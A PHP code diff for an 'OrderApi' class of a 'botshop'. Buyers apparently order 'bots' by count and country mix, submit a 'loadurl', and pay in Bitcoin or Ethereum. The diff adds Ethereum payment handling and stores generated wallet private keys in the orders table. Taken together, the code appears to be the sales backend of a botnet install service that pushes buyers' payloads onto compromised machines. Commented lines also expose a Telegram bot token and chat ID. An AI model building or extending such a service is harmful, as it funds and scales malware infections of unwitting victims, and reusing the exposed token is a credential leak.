@@ -32,7 +32,7 @@ class OrderApi
         $price = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_pricelist WHERE iso_short = ? ");
         $price->execute(array("mix"));
         $DefaultMixPrice = $price->fetch();
-        $this->priceperbot = floatval($DefaultMixPrice);
+        $this->priceperbot = $DefaultMixPrice["price_usd"];
         $this->blockconfirms = 1;
         if($this->isTestnet){
             $this->blockchainAPI = "https://chain.so/api/v2/get_address_balance/BTCTEST/";
@@ -60,7 +60,7 @@ class OrderApi
 
     private function botsToUSD($bots)
     {
-        return $bots * $this->priceperbot;
+        return number_format($bots * $this->priceperbot, 2); // "5.00"
     }
 
     private function generateRandomString($length = 10) {
@@ -75,10 +75,19 @@ class OrderApi
 
     private function generateOrder($type, $bots,$loadurl,$apikey)
     {
-        $bitcoinAddress = $this->generateBitcoinAddress($this->isTestnet);
-        $usd = $this->botsToUSD($bots);
+        if($type == "eth"){
+            $ethDriver = new EthereumDriver();
+            $bitcoinAddress = $ethDriver->getNewWallet($this->isTestnet);
+            $usd = $this->botsToUSD($bots);
+            $coinsToPay = $ethDriver->CreateETHPrice($usd);;
+        }else{
+            $bitcoinAddress = $this->generateBitcoinAddress($this->isTestnet);
+            $usd = $this->botsToUSD($bots);
+           $coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
+        }
+
         $userAuthkey = md5($this->generateRandomString(30));
-        $coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
+
         $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (type, address, privatekey, usd, coinstopay, botamount, loadurl, userauthkey,from_access_api) VALUES (?, ?, ?, ?, ?, ?, ?, ?,?)");
         $statement->execute(array($type, $bitcoinAddress["address"], $bitcoinAddress["privatekey"], $usd, $coinsToPay, $bots,$loadurl,$userAuthkey,$apikey));
         return array(
@@ -91,7 +100,16 @@ class OrderApi
 
     private function generateOrderMix($type, $bots,$loadurl,$apikey,$mix)
     {
-        $bitcoinAddress = $this->generateBitcoinAddress($this->isTestnet);
+        if($type == "eth"){
+            $ethDriver = new EthereumDriver();
+            $bitcoinAddress = $ethDriver->getNewWallet($this->isTestnet);
+            $usd = $this->botsToUSD($bots);
+            $coinsToPay = $ethDriver->CreateETHPrice($usd);;
+        }else{
+            $bitcoinAddress = $this->generateBitcoinAddress($this->isTestnet);
+            $usd = $this->botsToUSD($bots);
+            $coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
+        }
 
         $usd = 0;
         $sql = "SELECT * FROM botshop_pricelist";
@@ -107,7 +125,7 @@ class OrderApi
 
         //$usd = $this->botsToUSD($bots);
         $userAuthkey = md5($this->generateRandomString(30));
-        $coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
+        //$coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
         $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (type, address, privatekey, usd, coinstopay, botamount, loadurl, userauthkey,from_access_api,word_mix) VALUES (?, ?, ?, ?, ?, ?, ?, ?,?,?)");
         $statement->execute(array($type, $bitcoinAddress["address"], $bitcoinAddress["privatekey"], $usd, $coinsToPay, $bots,$loadurl,$userAuthkey,$apikey,$mix));
         return array(
@@ -135,9 +153,15 @@ class OrderApi
         );
     }
 
-    public function checkAmount($address,$confirms){
-       $checked = json_decode(file_get_contents($this->blockchainAPI."/".$address."/".$confirms),true);
-       return $checked["data"]["confirmed_balance"];
+    public function checkAmount($address,$confirms,$type){
+        if($type== "eth"){
+            $driver = new EthereumDriver();
+            $ethereumOnWallet = $driver->getBalance($address)["result"];
+            return $driver->wei2eth($ethereumOnWallet) ;
+
+        }
+        $checked = json_decode(file_get_contents($this->blockchainAPI."/".$address."/".$confirms),true);
+        return $checked["data"]["confirmed_balance"];
     }
 
     public function detils(){
@@ -198,7 +222,7 @@ class OrderApi
         $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_orders WHERE userauthkey = ?");
         $statement->execute(array($address));
         $order = $statement->fetch();
-        $payAmount = $this->checkAmount( $order["address"],$this->blockconfirms);
+        $payAmount = $this->checkAmount( $order["address"],$this->blockconfirms,$order["type"]);
 
 
         if($order["coinstopay"] <= $payAmount){
@@ -211,8 +235,10 @@ class OrderApi
                 $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_orders SET payed = ?, taskid = ? WHERE address = ?");
                 $statement->execute(array(1, $taskid, $order["address"]));
                 echo json_encode(array("success"=>"true","message"=>"Success Ordered"));
+                //file_get_contents("https://api.telegram.org/bot626574855:AAFigV4LxuX40-e8XBTncHWu-TCDaVmKZFk/sendMessage?chat_id=-346183841&text=" . urlencode("someone has paid" .$payAmount));
             }else{
                 echo json_encode(array("success"=>"true","message"=>"Success Ordered"));
+                //file_get_contents("https://api.telegram.org/bot626574855:AAFigV4LxuX40-e8XBTncHWu-TCDaVmKZFk/sendMessage?chat_id=-346183841&text=" . urlencode("someone has paid" . $payAmount));
             }
 
         }else{
@@ -248,10 +274,10 @@ class OrderApi
     public function createoder(){
         $this->checkApi();
         if(!empty($_POST["load_counties"])){
-            $infos = $this->generateOrderMix("btc",$_POST["amount"],$_POST["loadurl"],$_POST["apikey"],$_POST["load_counties"]);
+            $infos = $this->generateOrderMix($_POST["type"],$_POST["amount"],$_POST["loadurl"],$_POST["apikey"],$_POST["load_counties"]);
             echo json_encode($infos);
         }else{
-            $infos = $this->generateOrder("btc",$_POST["amount"],$_POST["loadurl"],$_POST["apikey"]);
+            $infos = $this->generateOrder($_POST["type"],$_POST["amount"],$_POST["loadurl"],$_POST["apikey"]);
             echo json_encode($infos);
         }
         die();
